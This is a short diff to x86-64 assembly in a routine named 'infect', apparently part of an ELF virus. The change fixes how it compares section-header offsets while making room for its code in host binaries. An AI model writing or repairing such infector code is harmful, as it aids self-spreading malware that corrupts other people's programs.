@@ -987,7 +987,7 @@ infect:
 			push rcx
 			mov r11, [r13 + r15 + elf_shdr.sh_offset]
 			;cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
-			cmp dword r11d, vxoffset
+			cmp dword r11d, [vxoffset]
 			jl .next_shdr
 			;jge .mod_subsequent_shdr
 			mov rdx, modvxshdrpass0len
